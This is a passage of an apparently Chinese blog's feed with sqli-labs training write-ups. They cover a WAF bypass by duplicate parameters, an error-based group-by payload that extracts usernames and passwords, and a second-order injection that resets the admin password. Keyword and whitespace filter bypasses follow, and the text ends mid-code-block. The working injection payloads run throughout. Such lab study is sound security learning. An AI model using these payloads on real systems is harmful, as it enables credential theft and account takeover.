+&lt;p>&lt;strong>问：&lt;/strong>&lt;code>index.php?id=1&amp;amp;id=2&lt;/code>，这时回显是&lt;code>id=1&lt;/code>还是&lt;code>id=2&lt;/code>呢？&lt;/p>
+&lt;p>**答：**apache (php) 解析最后一个参数，即回显&lt;code>id=2&lt;/code>；tomcat (jsp) 解析第
+一个参数，即回显&lt;code>id=1&lt;/code>。&lt;/p>
+&lt;p>作者：Hyafinthus 链接：https://www.jianshu.com/p/46cb6c354de5&lt;/p>
+&lt;/blockquote>
+&lt;p>这是一个利用 &lt;code>apache+php&lt;/code> 和 &lt;code>tomcat+jsp&lt;/code> 对重名 query string 参数解析结果的绕过。我们尝试下 &lt;code>?id=1&amp;amp;id=2'&lt;/code>，成功绕过。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-5/image-20220513143042849.png"
+width="1334"
+height="498"
+srcset="https://weakptr.site/p/sqli-labs-training-5/image-20220513143042849_hu4cb981f7210b33b31a88be9915dd45b4_221345_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-5/image-20220513143042849_hu4cb981f7210b33b31a88be9915dd45b4_221345_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220513143042849"
+class="gallery-image"
+data-flex-grow="267"
+data-flex-basis="642px"
+>&lt;/p>
+&lt;p>剩下就不多谈了，把注入的 payload 放到第二个参数里就可以绕过 WAF 的防御。&lt;/p>
+&lt;p>最后补充一点如何判断服务器类型。一个主要的办法就是看 HTTP 响应里的 &lt;code>Server&lt;/code> 头——但一般多个服务器后端的情况下，更可能出现的是一个大反代服务去代理其他所有服务，根据 url 来匹配转发。这种情况下 &lt;code>Server&lt;/code> 头一般就固定是反代服务器了。在这题里是&lt;code>nginx/1.21.6&lt;/code>，我们看不到&lt;code>apache&lt;/code>和&lt;code>tomcat&lt;/code>。&lt;/p>
+&lt;p>另一种方法是靠经验判断=。=一般来说，写 php 的喜欢配 apache 或者 nginx，写 jsp 的会优先考虑java的容器比如&lt;code>tomcat&lt;/code>。写 go 的一般裸奔或者配个 nginx 反代，Python 就可能是 uwsgi 或者别的实现 WSGI 协议的服务器或者裸奔，现在也可能有 ASGI 的服务器。这些只能靠对后端生态的了解来猜测了。如果是前后端分离架构的话，后端开发语言和环境的特征就更难找了。&lt;/p>
+&lt;h2 id="less-30">Less-30&lt;/h2>
+&lt;p>WAF，无错误回显，有正确回显，字符型注入双引号。&lt;/p>
+&lt;p>可以考虑用 &lt;code>union select&lt;/code> 解决，WAF 绕过方法和 Less-29 一样。&lt;/p>
+&lt;h2 id="less-31">Less-31&lt;/h2>
+&lt;p>和 Less-30 一样。 WTF ？看了眼源码发现就多了一个右括号。&lt;/p>
+&lt;h2 id="总结">总结&lt;/h2>
+&lt;p>时间有限，还得抓紧开始看自考的课程。今天就先这样意思意思，没别的意思。&lt;/p>
+&lt;p>sqli-labs 的 WAF 感觉怪怪的，不像是之前见过的 php 的 WAF，绕过的思路感觉还是比较有趣的，反代形式的WAF如果不注意可能会被这个问题坑到。&lt;/p>
+&lt;p>28题审阅源码才发现过滤方法有漏洞，测 SQL 注入问题的时候还得多准备点各种 payload。我感觉是有很大自动测的空间，可以自己写个测试脚本啥的，但 sqlmap 珠玉在前=。= 或许有机会看看 sqlmap 源码会有更多启发。&lt;/p>
+&lt;p>今天就这样，辛苦我自己啦。&lt;/p></description></item><item><title>sqli-labs 实验记录 #4</title><link>https://weakptr.site/p/sqli-labs-training-4/</link><pubDate>Thu, 12 May 2022 17:23:32 +0800</pubDate><guid>https://weakptr.site/p/sqli-labs-training-4/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>惯例的前言，虽然没什么可说的。本篇从 page-2 开始，page-2 开头还是 21/22 这两题，base64 编码加上引号注入即可完成。正文从 23 开始。&lt;/p>
+&lt;h2 id="less-23">Less-23&lt;/h2>
+&lt;p>提示 error based, no comments。所以应该是屏蔽了 &lt;code>--&lt;/code>、&lt;code>#&lt;/code>和&lt;code>/**/&lt;/code>，所以注入要看SQL注入位置的后半句SQL怎么写的了。&lt;/p>
+&lt;p>尝试用 &lt;code>extractvalue&lt;/code> 攻击发现不行。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">?id=1&amp;#39; and extractvalue(1,concat(&amp;#39;~&amp;#39;,password)) or &amp;#39;1&amp;#39;=&amp;#39;1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>错误：&lt;code>Only constant XPATH queries are supported&lt;/code>，&lt;code>updatexml&lt;/code>也是一样。换成 &lt;code>group by&lt;/code> 法攻击（仅限 MySQL &amp;lt; 5.7.36）。注入&lt;code>1'&lt;/code>确认后面跟着的是&lt;code>LIMIT 0,1&lt;/code>。&lt;/p>
+&lt;p>手工调试出一个预期的SQL：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">select&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 从 1&amp;#39; and 开始承接原查询
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="mi">123&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 子查询包装，把子查询确保 payload 不影响原查询。
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;~&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 拼接如 username~password 的字符串，limit 避免子查询返回多行出错，也可枚举所有行。目的都是确保能触发 duplicate entry
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;~&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">floor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">all&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 构造个临时表，两行就够
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">by&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 在这里触发 duplicate entry 错误
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 避免 Every derived table must have its own alias 错误
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 承接原查询的单引号，后面就是原查询的剩余部分了。
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>提取 Payload：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">?id=1&amp;#39; and (select 123 from (select count(*),concat((select concat(username,&amp;#39;~&amp;#39;,password) from users limit 0,1),&amp;#39;~&amp;#39;,floor(rand(14)*2)) x from (select 1 union all select 2) as t group by x) x) and &amp;#39;1&amp;#39;=&amp;#39;1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512133709602.png"
+width="1218"
+height="435"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512133709602_hud8abda6fb5f8bd1652da864a56d4f695_198434_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512133709602_hud8abda6fb5f8bd1652da864a56d4f695_198434_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512133709602"
+class="gallery-image"
+data-flex-grow="280"
+data-flex-basis="672px"
+>&lt;/p>
+&lt;p>成功&lt;/p>
+&lt;h2 id="less-24">Less-24&lt;/h2>
+&lt;p>提示 second degree injections ，但谷歌没有找到这个说法，但有另一个说法叫 second-order injection。摘自 portswigger：&lt;/p>
+&lt;blockquote>
+&lt;p>Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way.&lt;/p>
+&lt;/blockquote>
+&lt;p>再看页面：&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512134251988.png"
+width="1078"
+height="479"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512134251988_hu0f2b151fbf573c8051608f0a58f64beb_100741_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512134251988_hu0f2b151fbf573c8051608f0a58f64beb_100741_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512134251988"
+class="gallery-image"
+data-flex-grow="225"
+data-flex-basis="540px"
+>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512134257960.png"
+width="721"
+height="490"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512134257960_hu704286ccb7af4df42963ee95ae469ab7_119881_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512134257960_hu704286ccb7af4df42963ee95ae469ab7_119881_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512134257960"
+class="gallery-image"
+data-flex-grow="147"
+data-flex-basis="353px"
+>&lt;/p>
+&lt;p>分别有注册和登陆两个位置，从 second-order injection 的描述来看，如果存在于 Less-24 的话，可能的情况就是在注册接口允许特殊字符比如 &lt;code>admin' or 1=1&lt;/code> 作为用户名。&lt;/p>
+&lt;p>首先尝试了注册正常用户 &lt;code>test123&lt;/code> 并登陆，但登录后跳转&lt;code>login.php&lt;/code>却没有内容。看来没有更多提示了。&lt;/p>
+&lt;p>再注册用户 &lt;code>test123'&amp;quot;&lt;/code>并登陆，跳转&lt;code>login.php&lt;/code> 依然没有内容。这就不懂了，没辙，审下源码。&lt;/p>
+&lt;p>注册：&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512140810273.png"
+width="742"
+height="241"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512140810273_huebf7869fb04f3ba97fd6e793e4b2c787_37392_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512140810273_huebf7869fb04f3ba97fd6e793e4b2c787_37392_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512140810273"
+class="gallery-image"
+data-flex-grow="307"
+data-flex-basis="738px"
+>&lt;/p>
+&lt;p>立刻注意到&lt;code>mysql_escape_string&lt;/code>，可能存在宽字符注入的问题，但和 second-order injection 好像搭不上关系，继续往下看。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512141813442.png"
+width="854"
+height="283"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512141813442_hu11baa8e074c48d8282ad32919836a806_42044_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512141813442_hu11baa8e074c48d8282ad32919836a806_42044_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512141813442"
+class="gallery-image"
+data-flex-grow="301"
+data-flex-basis="724px"
+>&lt;/p>
+&lt;p>并无特别之处。继续看登陆。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512142053554.png"
+width="868"
+height="428"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512142053554_huc050794fffb5892bb09f836cbad175b3_57123_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512142053554_huc050794fffb5892bb09f836cbad175b3_57123_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512142053554"
+class="gallery-image"
+data-flex-grow="202"
+data-flex-basis="486px"
+>&lt;/p>
+&lt;p>发现问题了。登陆成功应该设置 &lt;code>Auth&lt;/code> 这个 cookie 但我没找到。&lt;code>Location&lt;/code> 这个 HTTP 头也没有出现在响应里。这肯定不是正常的挑战，不审阅代码根本看不到这有个 &lt;code>Auth&lt;/code> cookie 要设置，还有登陆成功后跳转的位置是 &lt;code>logged-in.php&lt;/code>。&lt;/p>
+&lt;p>看起来是 sqli-labs 自己的 bug。页面上有几个 PHP 的警告：&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512142824705.png"
+width="1682"
+height="137"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512142824705_hud2604bbbf213c899bb5235f8daa2f6d6_23424_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512142824705_hud2604bbbf213c899bb5235f8daa2f6d6_23424_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512142824705"
+class="gallery-image"
+data-flex-grow="1227"
+data-flex-basis="2946px"
+>&lt;/p>
+&lt;p>尝试修复。&lt;/p>
+&lt;ol>
+&lt;li>把&lt;code>Less-24/login.php&lt;/code>的&lt;code>&amp;lt;?php&lt;/code>标签放到最前，&lt;code>html&lt;/code>改成&lt;code>echo &amp;lt;&amp;lt;&amp;lt;END&lt;/code> heredoc 形式，放到登陆失败的 &lt;code>else&lt;/code> 分支里。&lt;/li>
+&lt;li>把&lt;code>sql-connections/sql-connect.php&lt;/code>的&lt;code>?&amp;gt;&lt;/code>删除&lt;/li>
+&lt;li>把&lt;code>sql-connections/db-creds.inc&lt;/code>的&lt;code>?&amp;gt;&lt;/code>删除&lt;/li>
+&lt;/ol>
+&lt;p>这和 php 如何发起 HTTP 响应有关系，HTTP 头只能出现在 body 前，如果解释器先遇到了 HTML 或者别的输出语句，那写 body 之前肯定是先把 header 给写完了。开始输出 body 部分后再调用 &lt;code>setcookie&lt;/code> 或 &lt;code>header&lt;/code> 就已经太迟了，HTTP 头已经发给客户端了。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512144304913.png"
+width="1092"
+height="566"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512144304913_hu4b244e74ae756690a2ee967cb6036017_186825_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512144304913_hu4b244e74ae756690a2ee967cb6036017_186825_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512144304913"
+class="gallery-image"
+data-flex-grow="192"
+data-flex-basis="463px"
+>&lt;/p>
+&lt;p>修复后成功进入登录后界面，是个修改密码的表单。审代码前盲猜是直接用了 &lt;code>$_SESSION['username']&lt;/code> 而没转义导致 second-order injection。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512144639504.png"
+width="998"
+height="235"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512144639504_hu32a2e110958d35600cb55959b0f398e7_42917_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512144639504_hu32a2e110958d35600cb55959b0f398e7_42917_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512144639504"
+class="gallery-image"
+data-flex-grow="424"
+data-flex-basis="1019px"
+>&lt;/p>
+&lt;p>猜对了。&lt;/p>
+&lt;p>接着用&lt;code>test123'&lt;/code>这个账号登陆试试，触发报错：&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512144850227.png"
+width="345"
+height="49"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512144850227_hu3b147c4d85e7684d5cf3be4bdfc97e87_4728_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512144850227_hu3b147c4d85e7684d5cf3be4bdfc97e87_4728_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512144850227"
+class="gallery-image"
+data-flex-grow="704"
+data-flex-basis="1689px"
+>&lt;/p>
+&lt;p>这里形成的是一个 &lt;code>update&lt;/code> 注入，所以注册一个用户名为 &lt;code>test123' or username='admin&lt;/code> 的用户即可修改 admin 的密码。&lt;/p>
+&lt;h2 id="less-25">Less-25&lt;/h2>
+&lt;p>提示 all your &amp;lsquo;OR&amp;rsquo; and &amp;lsquo;AND&amp;rsquo; belongs to us，服务端过滤了 &lt;code>AND&lt;/code> 和 &lt;code>OR&lt;/code> 两个关键词，但 &lt;code>UNION ALL&lt;/code> 还能用。尝试 &lt;code>?id=0' union all select 1,username,3 from users where '1'='1&lt;/code> 成功。但 &lt;code>password&lt;/code> 里的 &lt;code>or&lt;/code> 也被过滤了。注意页面底部有个 hint 提示过滤后的文本是什么样。&lt;/p>
+&lt;p>尝试双写 bypass &lt;code>?id=0' union all select 1,username,passwoorrd from users where '1'='1&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512151638205.png"
+width="1079"
+height="399"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512151638205_hu0fc571f82d87cb839b319785f54001a6_37881_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512151638205_hu0fc571f82d87cb839b319785f54001a6_37881_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512151638205"
+class="gallery-image"
+data-flex-grow="270"
+data-flex-basis="649px"
+>&lt;/p>
+&lt;p>成功。&lt;/p>
+&lt;h2 id="less-26">Less-26&lt;/h2>
+&lt;p>提示 all your spaces and comments belongs to us，空格和注释会被过滤。&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>?id=1';--%20&lt;/code>，发现&lt;code>--&lt;/code>被过滤&lt;/li>
+&lt;li>&lt;code>?id=1';%23&lt;/code>，发现&lt;code>#&lt;/code>被过滤&lt;/li>
+&lt;li>&lt;code>?id=1';/*&lt;/code>，发现&lt;code>/*&lt;/code>被过滤。&lt;/li>
+&lt;/ul>
+&lt;p>三种注释符都被过滤了，尝试双写绕过。&lt;code>?id=1';//**&lt;/code> 依然被过滤。这就蛋疼了。审一下代码吧。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512154804832.png"
+width="807"
+height="215"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512154804832_hu59cb45eb6baf4f616cf0bc88b3adeb2e_38223_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512154804832_hu59cb45eb6baf4f616cf0bc88b3adeb2e_38223_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512154804832"
+class="gallery-image"
+data-flex-grow="375"
+data-flex-basis="900px"
+>&lt;/p>
+&lt;p>这些字符都被替换了&lt;code>/*-#\s\\&lt;/code>。经过谷歌发现一个绕过的方法，尝试用 ASCII 码表中的特殊空白符绕过。&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.jianshu.com/p/ff72f2c6d99c" target="_blank" rel="noopener"
+>参考：Sqli-Labs：Less 26 - Less 26a&lt;/a>&lt;/p>
+&lt;p>先测一遍这些特殊字符：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">echo&lt;/span> &lt;span class="nx">preg_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/\s/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;@&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;1&lt;/span>&lt;span class="se">\x09&lt;/span>&lt;span class="s2">2&lt;/span>&lt;span class="se">\x0a&lt;/span>&lt;span class="s2">3&lt;/span>&lt;span class="se">\x0c&lt;/span>&lt;span class="s2">4&lt;/span>&lt;span class="se">\x0b&lt;/span>&lt;span class="s2">5&lt;/span>&lt;span class="se">\x0d&lt;/span>&lt;span class="s2">6&lt;/span>&lt;span class="se">\xa0&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>发现只有&lt;code>\xa0&lt;/code>没有匹配到&lt;code>\s&lt;/code>这个正则，接着尝试 union 注入，用&lt;code>%a0&lt;/code>替代&lt;code>%20&lt;/code>。可以写个脚本把&lt;code>%00&lt;/code>到&lt;code>%ff&lt;/code>都试一遍看看哪些字符可用。&lt;/p>
+&lt;p>&lt;code>\xa0&lt;/code>不在 ascii 码表内，&lt;code>latin1&lt;/code>编码中表示&lt;code>non breaking space&lt;/code>。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
